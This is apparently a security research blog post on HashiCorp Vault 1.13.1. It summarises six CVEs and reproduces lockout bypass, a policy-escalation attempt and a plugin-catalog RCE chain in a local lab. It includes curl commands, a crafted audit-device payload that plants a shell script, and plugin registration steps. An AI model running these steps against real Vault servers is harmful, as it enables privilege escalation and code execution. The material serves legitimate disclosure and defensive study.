---
title: "HashiCorp Vault 1.13.1 — Vulnerability Research Notes"
description: "Auth bypass, enumeration, privilege escalation and RCE issues affecting Vault 1.13.1"
pubDate: 2026-07-28
category: "cyber"
---

## Introduction

HashiCorp Vault is a widely adopted secrets-management platform used to protect
sensitive data such as API keys, tokens, passwords, and encryption keys. Its
design relies heavily on strong authentication, authorization, and identity
mechanisms. However, even mature security platforms can exhibit weaknesses,
especially when new features interact in unexpected ways or when cryptographic
assumptions subtly fail.

Vault version **1.13.1**, while stable and widely deployed, is associated with
several vulnerabilities discovered through coordinated disclosure and industry
security testing. These issues impact encryption integrity, PKI authorization,
and backend query handling, with severity varying depending on deployment
architecture and enabled subsystems. Below is a summary of the most relevant
findings for 1.13.1, followed by a walkthrough of how a few of them were
reproduced in a local lab.

## Summary of vulnerabilities

Vault's authentication, authorization, and certificate-based identity
subsystems introduce several subtle but impactful weaknesses that attackers can
exploit without needing direct access to secrets. These flaws primarily affect
how Vault processes usernames, enforces lockout policies, evaluates
authentication timing, and handles certificate or plugin-based trust. Together,
they undermine core assumptions about account enumeration resistance,
brute-force protection, identity integrity, and code-execution boundaries.

- **CVE-2025-6010** — Username Enumeration via Error Message Inconsistency: Vault leaks the existence of usernames by returning different error messages once the lockout threshold is reached, enabling attackers to identify valid accounts without password guesses.
- **CVE-2025-6004** — Lockout Bypass Through Username Case Variations: altering the capitalization of a known username (e.g. `admin` vs `Admin`) lets an attacker avoid triggering Vault's lockout mechanism and continue brute-forcing credentials.
- **CVE-2025-6011** — Timing-Based User Existence Detection: Vault performs a bcrypt comparison only for valid usernames; nonexistent accounts trigger an early return, creating a timing discrepancy that reveals which usernames are real.
- **CVE-2025-6037** — Certificate Entity Impersonation in Non-CA Mode: an attacker with access to the private key of a pinned certificate can submit a modified certificate containing an arbitrary CN, causing Vault to assign the alias name to that attacker-controlled CN.
- **CVE-2025-5999** — Privilege Escalation via Policy Normalization Flaws: weaknesses during policy merging and normalization allow malicious input to shape evaluated policies in unintended ways, potentially resulting in root-level privilege escalation.
- **CVE-2025-6000** — Remote Code Execution via Plugin Catalog Manipulation: insufficient validation of plugin catalog entries enables attackers to introduce malicious or unauthorized plugin references, leading to arbitrary code execution. Exploitation is non-trivial, since it requires obtaining a binary hash that is inherently difficult to acquire.

## Building the test environment

The lab was deployed using Docker with Vault's default dev installation:

```
docker run -d --name vault -p 8200:8200 -e VAULT_DEV_ROOT_TOKEN_ID=myroot \
  -e SKIP_SETCAP=true hashicorp/vault:1.13.1 sh -c \
  "mkdir -p /vault/plugins && vault server -dev -dev-plugin-dir=/vault/plugins -dev-listen-address=0.0.0.0:8200"
```

This also creates the `/vault/plugins` directory needed to reproduce
CVE-2025-6000, while generating a root token (`myroot`) for full administrative
control during testing.

## CVE-2025-6004 — Lockout bypass

A test user was created to reproduce this case-sensitive username handling
flaw. By altering the capitalization or spacing of the same username, an
attacker can keep submitting password attempts without triggering the lockout
mechanism. After enough failed attempts the account locks — but the lock only
applies to the exact string used. Changing the case (`user` → `useR`), or even
appending trailing whitespace, is treated as a different identity, and Vault
happily accepts more login attempts against the same underlying account.

## CVE-2025-5999 — Root privilege escalation

A low-privilege user was created with a minimal ACL policy:

```
path "identity/entity-alias" {
  capabilities = ["create", "update"]
}
path "auth/token/lookup-self" {
  capabilities = ["read"]
}
path "sys/auth" {
  capabilities = ["read"]
}
path "identity/entity/id/*" {
  capabilities = ["update", "read", "sudo"]
}
path "identity/entity/name/*" {
  capabilities = ["read"]
}
path "identity/entity/name" {
  capabilities = ["list"]
}
```

With this policy alone the account can't list secrets or browse tools/policies,
confirming the restriction is enforced as expected. The escalation path uses
the token to look up its own entity ID, then attempts to patch that entity's
policies directly:

```powershell
$login = curl.exe -s -X POST -d '{\"password\":\"lowpriv\"}' `
  http://127.0.0.1:8200/v1/auth/userpass/login/lowpriv | ConvertFrom-Json
$TOKEN = $login.auth.client_token

curl.exe -s -H "X-Vault-Token: $TOKEN" `
  http://127.0.0.1:8200/v1/auth/token/lookup-self   # -> entity_id

curl.exe -s -X POST -H "X-Vault-Token: $TOKEN" -H "Content-Type: application/json" `
  -d '{\"policies\":[\"ROOT\"]}' `
  "http://127.0.0.1:8200/v1/identity/entity/id/<entity_id>"
```

A direct request for the literal `root` policy is rejected ("policies cannot
contain root"), but a normalization flaw in how policy names are merged allows
a crafted variant to slip through the check while still resolving to root
privileges once applied — after which the account has unrestricted access to
the Vault.

## CVE-2025-6000 — RCE via plugin catalog abuse

This one requires a token with `sys/audit`-level permissions. Vault normally
requires a valid SHA-256 hash of a plugin binary before it can be registered
and executed, which should prevent unauthorized binaries from running.

**Step 1 — locate the plugin directory** (`/vault/plugins` in this lab) and
confirm the catalog rejects unknown commands without a valid hash:

```
curl.exe -X PUT -H "X-Vault-Token: myroot" -H "Content-Type: application/json" -d \
  '{\"sha256\":\"0000...0000\",\"command\":\"nonexistent\"}' \
  http://127.0.0.1:8200/v1/sys/plugins/catalog/auth/test
```

**Step 2 — plant the payload** via a malicious file-type audit device, using
the `prefix` option to smuggle a shell script into the plugin directory:

```json
{
  "type": "file",
  "options": {
    "file_path": "/vault/plugins/evil_plugin",
    "mode": "0755",
    "prefix": "#!/bin/sh\necho pwned > /tmp/test.txt\nexit 0\n#"
  }
}
```

```
curl.exe -X POST -H "X-Vault-Token: myroot" -H "Content-Type: application/json" \
  -d "@payload.json" http://127.0.0.1:8200/v1/sys/audit/malicious

curl.exe -X DELETE -H "X-Vault-Token: myroot" \
  http://127.0.0.1:8200/v1/sys/audit/malicious
```

The audit device is deleted immediately after the file is written, otherwise
Vault keeps appending new log entries to the same file.

**Step 3 — obtain the hash.** No API exposed a way to retrieve it remotely in
this setup, so it was read directly from the server for lab purposes
(`sha256sum evil_plugin`) — not representative of a fully remote attack path.
A socket-based audit device was also tried as a possible remote alternative to
leak the hash, but timestamp noise in the streamed data made it unreliable.

**Step 4 — register and trigger the plugin** with the correct checksum:

```
curl.exe -X PUT -H "X-Vault-Token: myroot" -H "Content-Type: application/json" -d \
  '{\"sha256\":\"<computed_hash>\",\"command\":\"evil_plugin\"}' \
  http://127.0.0.1:8200/v1/sys/plugins/catalog/auth/malicious
```

Once registered with a valid checksum, Vault executes the planted binary on
load — confirmed by the `pwned` marker written to `/tmp/test.txt` inside the
container. In practice, the difficulty of remotely obtaining a valid hash is
the main thing standing between this bug and full remote code execution.

## Takeaways

None of these bugs require pre-existing access to stored secrets — they live
in the authentication, policy-normalization, and plugin-trust layers around
Vault rather than in the secrets engine itself. Case-insensitive lockout
handling, permissive policy merging, and catalog entries that trust a
client-supplied hash are the common thread. Patching to a fixed release and
tightening who holds `sys/audit` and `sys/plugins` capabilities closes most of
this off.

## References

- [Six Vault vulnerabilities open the door to RCE and privilege escalation](https://gm0.medium.com/six-vault-vulnerabilities-open-the-door-to-remote-code-execution-and-privilege-escalation-1e380d0b058c)
- [Cracking the Vault: zero-day flaws in authentication, identity and authorization in HashiCorp Vault](https://cyata.ai/blog/cracking-the-vault-how-we-found-zero-day-flaws-in-authentication-identity-and-authorization-in-hashicorp-vault/)
